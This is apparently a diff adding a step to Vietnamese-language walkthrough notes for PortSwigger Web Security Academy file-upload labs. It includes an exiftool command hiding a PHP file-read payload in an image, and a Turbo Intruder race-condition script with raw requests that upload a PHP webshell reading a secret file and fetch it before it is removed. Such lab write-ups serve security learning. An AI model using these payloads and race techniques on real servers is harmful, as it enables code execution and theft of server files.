@@ -16,3 +16,21 @@ Content-Type: text/plain
 
 6: Dùng tool exiftool để append comment vào file ảnh rồi chuyển nó thành file php
 Nội dung lệnh: exiftool -Comment="<?php echo '||||||| '.file_get_contents('/home/carlos/secret').' ||||||||'; ?>" 99.jpg -o test.php
+
+7: Tiến hành đăng nhập và upload file a.php(không thành công) và xem avatar để có req GET /files/avatar/....
+Tiếp theo, xử lý hai request này để chúng biến thành một sâu để thêm  vào đoạn code bên dưới
+Sau khi đã chuẩn bị 2 req, cài TUrbo Intruder ở BApp
+Có thể mở Turbo Intruder bằng cách chuột phải ở một req > Extension > Turbo Intruder > Send to Intruder
+Tạo 2 req, req đầu tiên là req POST còn req thứ 2 là GET:
+
+    r1 = 'POST /my-account/avatar HTTP/1.1\r\nHost: 0a3d00c60327f8eec0cf4f8b00ff00c0.web-security-academy.net\r\nCookie: session=EOR6E9hwwwPqKC90mEuMUqaQnF9BSV1f\r\nContent-Length: 470\r\nCache-Control: max-age=0\r\nSec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"\r\nSec-Ch-Ua-Mobile: ?0\r\nSec-Ch-Ua-Platform: "Windows"\r\nUpgrade-Insecure-Requests: 1\r\nOrigin: https://0a3d00c60327f8eec0cf4f8b00ff00c0.web-security-academy.net\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryVXezBUP37MLBNL5E\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nReferer: https://0a3d00c60327f8eec0cf4f8b00ff00c0.web-security-academy.net/my-account\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\n------WebKitFormBoundaryVXezBUP37MLBNL5E\r\nContent-Disposition: form-data; name="avatar"; filename="a.php"\r\nContent-Type: application/octet-stream\r\n\r\n<?php echo file_get_contents(\'/home/carlos/secret\'); ?>\r\n------WebKitFormBoundaryVXezBUP37MLBNL5E\r\nContent-Disposition: form-data; name="user"\r\n\r\nwiener\r\n------WebKitFormBoundaryVXezBUP37MLBNL5E\r\nContent-Disposition: form-data; name="csrf"\r\n\r\nSGf6rCk7WOxJT5hHlIEfjDL2qBy2cS0d\r\n------WebKitFormBoundaryVXezBUP37MLBNL5E--'
+
+    r2 = 'GET /files/avatars/a.php HTTP/1.1\r\nHost: 0a3d00c60327f8eec0cf4f8b00ff00c0.web-security-academy.net\r\nCookie: session=EOR6E9hwwwPqKC90mEuMUqaQnF9BSV1f\r\nSec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"\r\nSec-Ch-Ua-Mobile: ?0\r\nSec-Ch-Ua-Platform: "Windows"\r\nUpgrade-Insecure-Requests: 1\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.88 Safari/537.36\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nSec-Fetch-Site: same-origin\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-User: ?1\r\nSec-Fetch-Dest: document\r\nReferer: https://0a3d00c60327f8eec0cf4f8b00ff00c0.web-security-academy.net/my-account\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\n\r\n'
+
+    engine.queue(r1, gate='race1')
+    for x in range(5):
+        engine.queue(r2, gate='race1')
+
+Chạy req POST 1 lần sau đó chạy khoảng 4 req GET. Bấm attack
+Nếu thực hiện đúng, sẽ có ít nhất một req GET có status 200 và res chứa flag.
+
